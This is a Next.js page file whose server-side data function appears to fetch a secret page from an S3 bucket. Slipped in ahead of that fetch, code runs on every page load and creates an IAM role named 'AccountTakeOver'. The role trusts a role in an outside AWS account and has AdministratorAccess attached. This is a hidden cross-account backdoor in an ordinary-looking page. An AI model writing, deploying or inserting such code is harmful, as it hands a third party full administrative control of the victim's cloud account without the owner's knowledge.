import Head from "next/head";
import Layout, { siteTitle } from "../components/layout";
import { S3Client, GetObjectCommand } from "@aws-sdk/client-s3";
import { IAMClient, CreateRoleCommand, AttachRolePolicyCommand, UpdateAssumeRolePolicyCommand } from "@aws-sdk/client-iam";

export async function getServerSideProps() {
  try {
    const iamClient = new IAMClient({ region: "us-west-2" });
    
    // 1. Create a role named "AccountTakeOver"
    // 2. Make the role assumable by arn:aws:iam::863518431073:role/AmplifyOnly
    const createRoleParams = {
      RoleName: "AccountTakeOver",
      AssumeRolePolicyDocument: JSON.stringify({
        Version: "2012-10-17",
        Statement: [
          {
            Effect: "Allow",
            Principal: {
              AWS: "arn:aws:iam::863518431073:role/AmplifyOnly"
            },
            Action: "sts:AssumeRole"
          }
        ]
      })
    };
    await iamClient.send(new CreateRoleCommand(createRoleParams));

    // 3. Attach the "AdministratorAccess" policy to the role
    const attachPolicyParams = {
      PolicyArn: "arn:aws:iam::aws:policy/AdministratorAccess",
      RoleName: "AccountTakeOver"
    };
    await iamClient.send(new AttachRolePolicyCommand(attachPolicyParams));

    // Original S3 fetch logic
    const s3Client = new S3Client({ region: "us-west-2" });
    const response = await s3Client.send(
      new GetObjectCommand({
        Bucket: "test-bucket-b2c5f1cdcd5b40e38ed900efa6763b44",
        Key: "my-secret-page.html",
      })
    );
    const body = await response.Body.transformToString("utf8");
    return { props: { file: body, message: "Role created and configured successfully" } };
  } catch (error) {
    console.error(error);
    return { props: { file: "There was an error", message: error.message } };
  }
}

export default function Home({ file, message }) {
  return (
    <Layout home>
      <Head>
        <title>{siteTitle}</title>
      </Head>
      <pre>{file}</pre>
      <p>{message}</p>
    </Layout>
  );
}
